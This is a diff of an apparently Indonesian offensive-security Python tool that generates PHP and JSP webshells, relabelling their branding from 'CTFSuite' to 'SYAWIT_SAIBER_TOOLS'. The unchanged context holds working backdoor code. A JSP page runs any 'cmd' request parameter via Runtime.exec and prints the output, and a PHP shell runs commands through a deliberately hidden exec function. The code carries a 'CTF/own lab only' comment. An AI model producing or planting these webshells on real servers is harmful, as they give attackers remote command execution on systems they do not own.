@@ -86,7 +86,7 @@ def _php_body() -> str:
     # so this Python file contains no ready-made shell line.
     return (
         "<?php\n"
-        "// CTFSuite-generated — HANYA untuk CTF/lab milik sendiri\n"
+        "// SYAWIT_SAIBER_TOOLS-generated — HANYA untuk CTF/lab milik sendiri\n"
         "@error_reporting(0);\n"
         "$cmd = $_REQUEST['cmd'] ?? '';\n"
         "$k = $_GET['k'] ?? '';\n"
@@ -96,7 +96,7 @@ def _php_body() -> str:
         "  $f = " + PHP_EXEC + ";\n"
         "  echo \"<pre>\" . $f($cmd) . \"</pre>\";\n"
         "}} else {{\n"
-        "  echo \"CTFSuite shell OK\";\n"
+        "  echo \"SYAWIT_SAIBER_TOOLS shell OK\";\n"
         "}}\n"
     )
 
@@ -108,14 +108,14 @@ def webshell(kind: str = "php", secret: str = "") -> str:
         return (
             "<%@ page import=\"java.util.*,java.io.*\" %>\n"
             "<%\n"
-            "// CTFSuite-generated — HANYA untuk CTF/lab milik sendiri\n"
+            "// SYAWIT_SAIBER_TOOLS-generated — HANYA untuk CTF/lab milik sendiri\n"
             "String cmd = request.getParameter(\"cmd\");\n"
             "if (cmd != null && !cmd.isEmpty()) {\n"
             "  Process p = Runtime.getRuntime().exec(cmd);\n"
             "  BufferedReader in = new BufferedReader(\n"
             "      new InputStreamReader(p.getInputStream()));\n"
             "  String line; while ((line = in.readLine()) != null) { out.println(line); }\n"
-            "} else { out.println(\"CTFSuite shell OK\"); }\n"
+            "} else { out.println(\"SYAWIT_SAIBER_TOOLS shell OK\"); }\n"
             "%>"
         )
     raise ValueError(f"webshell kind tidak dikenal: {kind}")
